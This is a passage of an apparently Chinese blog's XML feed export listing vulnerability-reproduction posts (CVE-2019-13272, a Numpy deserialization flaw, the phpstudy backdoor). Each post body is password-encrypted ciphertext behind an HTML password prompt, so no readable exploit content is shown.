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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>CVE-2019-13272</tag>
      </tags>
  </entry>
  <entry>
    <title>Numpy反序列化命令执行漏洞复现</title>
    <url>/2019/10/08/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy后门漏洞复现</title>
    <url>/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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